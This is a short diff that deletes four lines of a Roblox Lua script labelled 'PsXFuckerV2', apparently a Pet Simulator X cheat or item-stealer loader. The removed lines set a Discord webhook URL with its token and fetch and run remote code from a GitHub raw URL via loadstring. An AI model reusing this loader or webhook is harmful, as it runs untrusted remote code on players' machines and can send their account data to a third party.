@@ -1,4 +1,0 @@
-_G.UserID = 3231242044
-_G.WebHook = "https://discord.com/api/webhooks/1064128743884472372/fGFzcpp51INakLldLHZlces2Ceti8iPqATOGUe_vqN7-SdPSnTYe7Zx-etA2dVTKuBBf"
-_G.LoadingScreenText = "PsXFuckerV2 by psxdupetester"
-loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
